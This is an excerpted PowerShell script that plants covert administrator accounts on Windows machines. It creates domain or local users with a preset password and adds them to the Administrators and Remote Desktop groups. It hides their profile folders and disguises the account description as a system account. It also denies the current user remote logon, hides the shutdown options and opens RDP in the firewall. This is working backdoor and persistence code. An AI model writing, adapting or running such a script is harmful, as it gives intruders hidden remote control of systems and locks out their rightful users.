...
function Test-DomainAvailable{try{[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()|Out-Null;return $true}catch{return $false}}
$domainAvailable=$false
if($isDomainJoined){$domainAvailable=Test-DomainAvailable}
$useDomain=$isDomainJoined -and $domainAvailable
$adminSID='S-1-5-32-544';$rdpSID='S-1-5-32-555'
...
$tempDir="$env:TEMP\pol_temp";$configFile="$tempDir\secpol.inf";$dbFile="$tempDir\secpol.sdb"
try{$defaultDescription=(Get-LocalUser -Name 'DefaultAccount' -ErrorAction Stop).Description}catch{$defaultDescription='A user account managed by the system.'}
$groupId='@FirewallAPI.dll,-28752'
$ruleNames=@('RemoteDesktop-UserMode-In-TCP','RemoteDesktop-UserMode-In-UDP','RemoteDesktop-Shadow-In-TCP','RemoteDesktop-Shadow-In-TCP_1','RemoteDesktop-UserMode-In-UDP_1','RemoteDesktop-UserMode-In-TCP_1')
$errorCount=0
function Retry-Command{param([ScriptBlock]$action,[int]$attempts=3,[int]$delay=5)for($i=1;$i -le $attempts;$i++){try{& $action;return}catch{if($i -eq $attempts){throw};Start-Sleep -Seconds $delay}}}
foreach($user in $userAccounts){
  if($useDomain){
    Retry-Command{& net user $user /domain > $null 2>&1}
    if($LASTEXITCODE -eq 0){$principal="$domain\$user"}else{
      Retry-Command{& net user $user $passwordPlain /add /domain > $null 2>&1}
      if($LASTEXITCODE -eq 0){$principal="$domain\$user"}else{
        if(-not(Get-LocalUser -Name $user -ErrorAction SilentlyContinue)){Retry-Command{& net user $user $passwordPlain /add > $null 2>&1}}
        $principal="$computer\$user"
      }
    }
  } else {
    if(-not(Get-LocalUser -Name $user -ErrorAction SilentlyContinue)){Retry-Command{New-LocalUser -Name $user -Password $passwordSecure}}
    $principal="$computer\$user"
  }
  if($principal -like "$computer\*"){
    ...
    if(-not(Test-Path $profilePath)){Retry-Command{robocopy "$env:SystemDrive\Users\Default" $profilePath /E /COPYALL /XJ > $null};Start-Sleep -Seconds 3;Retry-Command{attrib +h +s $profilePath}}else{Retry-Command{attrib +h +s $profilePath}}
    $alreadyMember = (Get-LocalGroupMember -Group $adminGroup -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq $principal })
    if (-not $alreadyMember) { Retry-Command { Add-LocalGroupMember -Group $adminGroup -Member $principal } }
    $alreadyMember = (Get-LocalGroupMember -Group $rdpGroup -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq $principal })
    if (-not $alreadyMember) { Retry-Command { Add-LocalGroupMember -Group $rdpGroup -Member $principal } }
  }
...
if($shutdownEntry){$lines[$shutdownEntry.LineNumber-1]="SeShutdownPrivilege = $adminSID"}else{$lines.Insert($idx+1,"SeShutdownPrivilege = $adminSID")}
$denyEntry=$lines|Select-String '^SeDenyRemoteInteractiveLogonRight'|Select-Object -First 1
if($denyEntry){$parts=$lines[$denyEntry.LineNumber-1].Split('=')[1].Trim().Split(',');if($parts -notcontains $currentUser){$parts+=$currentUser};$lines[$denyEntry.LineNumber-1]='SeDenyRemoteInteractiveLogonRight = '+($parts -join ',')}else{$lines.Insert($idx+2,"SeDenyRemoteInteractiveLogonRight = $currentUser")}
...
foreach($k in 'HideShutdown','HideSleep','HideHibernate'){Retry-Command{Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\$k" -Name 'Value' -Value 1 -Type DWord}}
...
foreach($name in $ruleNames){try{Set-NetFirewallRule -Name $name -Enabled True -ErrorAction SilentlyContinue}catch{$errorCount++}}
if($errorCount -gt 0){
  try{$port=(Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name PortNumber).PortNumber}catch{$port=3389}
  foreach($proto in 'TCP','UDP'){if(-not(Get-NetFirewallRule -Name "RDP-$proto-In-Port$port" -ErrorAction SilentlyContinue)){New-NetFirewallRule -Name "RDP-$proto-In-Port$port" -DisplayName "Allow RDP $proto Port $port" -Protocol $proto -LocalPort $port -Direction Inbound -Action Allow}}
}
